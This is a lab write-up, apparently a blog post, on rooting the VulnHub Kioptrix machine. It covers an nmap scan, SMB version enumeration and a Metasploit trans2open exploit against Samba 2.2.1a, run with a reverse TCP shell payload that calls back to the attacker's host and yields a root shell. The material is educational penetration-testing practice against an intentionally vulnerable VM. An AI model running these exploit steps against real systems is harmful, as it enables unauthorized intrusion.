@@ -1,0 +1,302 @@
+---
+title: "Kioptrix"
+date: "2025-10-24"
+draft: false
+tags: ["VulnHub", "Machine", "Linux", "Easy", "Metasploit"]
+summary: "Legacy Linux box where a Samba 2.2.x exploit leads to instant root access."
+images: ["/static/images/kioptrix/preview.png"]
+---
+
+# Gaining Root with Metasploit
+
+---
+
+# Nmap Scan:
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nmap -sCV -T4 -p- 192.168.100.94
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-05 17:12 EST
+Nmap scan report for 192.168.100.94
+Host is up (0.0023s latency).
+Not shown: 65529 closed tcp ports (reset)
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+|_sshv1: Server supports SSHv1
+| ssh-hostkey: 
+|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
+|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
+|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
+80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+111/tcp   open  rpcbind     2 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100024  1          32768/tcp   status
+|_  100024  1          32768/udp   status
+139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-09-26T09:32:06
+|_Not valid after:  2010-09-26T09:32:06
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|_    SSL2_DES_64_CBC_WITH_MD5
+|_ssl-date: 2025-11-06T08:13:11+00:00; +9h59m44s from scanner time.
+32768/tcp open  status      1 (RPC #100024)
+MAC Address: 00:0C:29:F3:B3:43 (VMware)
+
+Host script results:
+|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+|_smb2-time: Protocol negotiation failed (SMB2)
+|_clock-skew: 9h59m43s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.90 seconds
+```
+
+It exposes SSH (port 22 — OpenSSH 2.9p2, **SSHv1 supported**, weak 1024-bit keys), HTTP/HTTPS (ports 80/443 — Apache 1.3.20 with mod_ssl/OpenSSL 0.9.6b, **SSLv2 enabled** and expired cert), SMB/NetBIOS on 139 (Samba smbd, workgroup MYGROUP), and RPC services on 111/32768 (rpcbind/status).
+
+I will proceed to enumerate the SMB service.
+
+# **Enumerating SMB**
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ msfconsole 
+Metasploit tip: Store discovered credentials for later use with creds
+                                                  
+ ______________________________________
+/ it looks like you're trying to run a \
+\ module                               /
+ --------------------------------------                                                                                                                                                      
+ \                                                                                                                                                                                           
+  \                                                                                                                                                                                          
+     __                                                                                                                                                                                      
+    /  \                                                                                                                                                                                     
+    |  |                                                                                                                                                                                     
+    @  @                                                                                                                                                                                     
+    |  |                                                                                                                                                                                     
+    || |/                                                                                                                                                                                    
+    || ||                                                                                                                                                                                    
+    |\_/|                                                                                                                                                                                    
+    \___/                                                                                                                                                                                    
+                                                                                                                                                                                             
+
+       =[ metasploit v6.4.95-dev                                ]
++ -- --=[ 2,566 exploits - 1,315 auxiliary - 1,680 payloads     ]
++ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > search smb_version
+
+Matching Modules
+================
+
+   #  Name                               Disclosure Date  Rank    Check  Description
+   -  ----                               ---------------  ----    -----  -----------
+   0  auxiliary/scanner/smb/smb_version  .                normal  No     SMB Version Detection
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version
+
+msf > use 0
+msf auxiliary(scanner/smb/smb_version) > options
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT                     no        The target port (TCP)
+   THREADS  1                yes       The number of concurrent threads (max one per host)
+
+View the full module info with the info, or info -d command.
+
+msf auxiliary(scanner/smb/smb_version) > set rhosts 192.168.100.94
+rhosts => 192.168.100.94
+msf auxiliary(scanner/smb/smb_version) > run
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.23/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] 192.168.100.94:139    -   Host could not be identified: Unix (Samba 2.2.1a)
+[*] 192.168.100.94        - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/smb/smb_version) > 
+```
+
+The Metasploit scan identified the target running **Samba version 2.2.1a** on a Unix system.
+
+# **Searchsploit — Samba 2.2 Exploit Candidates**
+
+I ran `searchsploit Samba 2.2` and found multiple ExploitDB PoCs and Metasploit modules for Samba 2.2-era vulnerabilities (`.rb` = Metasploit module; `.c/.pl/.py/.txt` = standalone PoC). I’ll pick the exploit that matches the target’s OS/arch/version for testing.
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ searchsploit Samba 2.2  
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Samba 2.0.x/2.2 - Arbitrary File Creation                                                                                                                                                                 | unix/remote/20968.txt
+Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                                                                                                              | osx/remote/9924.rb
+Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                                                                                                                   | linux/remote/16321.rb
+Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                         | bsd_x86/remote/16880.rb
+Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                                                                                                           | linux/local/23674.txt
+Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                       | linux_x86/remote/16861.rb
+Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                         | osx_ppc/remote/16876.rb
+Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                                                                                                                   | solaris_sparc/remote/16330.rb
+Samba 2.2.8 - Brute Force Method Remote Command Execution                                                                                                                                                 | linux/remote/55.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                                                                                                                | unix/remote/22468.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                                                                                                                | unix/remote/22469.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                                                                                                                | unix/remote/22470.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                                                                                                                | unix/remote/22471.txt
+Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                                                                                                                      | linux/remote/9936.rb
+Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                                                                                                   | unix/remote/22356.c
+Samba 2.2.x - Remote Buffer Overflow                                                                                                                                                                      | linux/remote/7.pl
+Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                                                                                                         | multiple/remote/10.c
+Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                                                     | linux/remote/7701.txt
+Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                                                                             | linux_x86/dos/36741.py
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+`call_trans2open` processes TRANS2_OPEN SMB requests; flawed parsing there causes buffer/heap overflows that can lead to remote code execution. It’s critical because SMB is network-exposed and the same handler was vulnerable across multiple OSes, so many PoCs target that routine.
+
+# **Metasploit — `call_trans2open` module**
+
+I inspected the `call_trans2open` Metasploit module, confirmed it targets Samba 2.2.x TRANS2_OPEN, and will set `RHOSTS`/`RPORT` to test SMB in a controlled lab. ****
+
+```bash
+msf > search trans2open
+
+Matching Modules
+================
+
+   #  Name                                                         Disclosure Date  Rank   Check  Description
+   -  ----                                                         ---------------  ----   -----  -----------
+   0  exploit/freebsd/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
+   1  exploit/linux/samba/trans2open                               2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
+   2  exploit/osx/samba/trans2open                                 2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
+   3  exploit/solaris/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
+   4    \_ target: Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce    .                .      .      .
+   5    \_ target: Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce  .                .      .      .
+
+Interact with a module by name or index. For example info 5, use 5 or use exploit/solaris/samba/trans2open
+After interacting with a module you can manually set a TARGET with set TARGET 'Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce'
+```
+
+I chose the Linux `call_trans2open` exploit for Samba 2.2.x (based on Nmap showing a Linux host).
+
+```bash
+msf > use 1
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf exploit(linux/samba/trans2open) > options
+
+Module options (exploit/linux/samba/trans2open):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.100.76   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+
+View the full module info with the info, or info -d command.
+
+msf exploit(linux/samba/trans2open) > set rhosts 192.168.100.94
+rhosts => 192.168.100.94
+[*] Started reverse TCP handler on 192.168.100.76:4444 
+[*] 192.168.100.94:139 - Trying return address 0xbffffdfc...
+[*] 192.168.100.94:139 - Trying return address 0xbffffcfc...
+[*] 192.168.100.94:139 - Trying return address 0xbffffbfc...
+[*] 192.168.100.94:139 - Trying return address 0xbffffafc...
+[*] Sending stage (1062760 bytes) to 192.168.100.94
+[*] 192.168.100.94 - Meterpreter session 5 closed.  Reason: Died
+[*] 192.168.100.94:139 - Trying return address 0xbffff9fc...
+[*] Sending stage (1062760 bytes) to 192.168.100.94
+[*] 192.168.100.94 - Meterpreter session 6 closed.  Reason: Died
+^C[-] 192.168.100.94:139 - Exploit failed [user-interrupt]: Interrupt 
+[-] run: Interrupted
+```
+
+It’s attempted a brute‑force attack that iterated through multiple target addresses ie; the selected payload did not execute successfully.
+
+![Kioptrix](/static/images/kioptrix/image.png)
+
+I searched for a Linux x86 reverse, non‑staged payload for the exploit.
+
+![Kioptrix](/static/images/kioptrix/image%201.png)
+
+## Exploiting
+
+```bash
+msf exploit(linux/samba/trans2open) > options
+
+Module options (exploit/linux/samba/trans2open):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.100.94   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   139              yes       The target port (TCP)
+
+Payload options (linux/x86/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   CMD    /bin/sh          yes       The command string to execute
+   LHOST  192.168.100.76   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Samba 2.2.x - Bruteforce
+
+View the full module info with the info, or info -d command.
+msf exploit(linux/samba/trans2open) > run 
+[*] Started reverse TCP handler on 192.168.100.76:4444 
+[*] 192.168.100.94:139 - Trying return address 0xbffffdfc...
+[*] 192.168.100.94:139 - Trying return address 0xbffffcfc...
+[*] 192.168.100.94:139 - Trying return address 0xbffffbfc...
+[*] 192.168.100.94:139 - Trying return address 0xbffffafc...
+[*] 192.168.100.94:139 - Trying return address 0xbffff9fc...
+[*] 192.168.100.94:139 - Trying return address 0xbffff8fc...
+[*] 192.168.100.94:139 - Trying return address 0xbffff7fc...
+[*] 192.168.100.94:139 - Trying return address 0xbffff6fc...
+[*] Command shell session 11 opened (192.168.100.76:4444 -> 192.168.100.94:32779) at 2025-11-05 17:51:45 -0500
+
+[*] Command shell session 12 opened (192.168.100.76:4444 -> 192.168.100.94:32780) at 2025-11-05 17:51:46 -0500
+[*] Command shell session 13 opened (192.168.100.76:4444 -> 192.168.100.94:32781) at 2025-11-05 17:51:47 -0500
+[*] Command shell session 14 opened (192.168.100.76:4444 -> 192.168.100.94:32782) at 2025-11-05 17:51:48 -0500
+whoami
+root
+hostname
+kioptrix.level1
+```
+
+🥳 I got a root shell on `kioptrix.level1`.
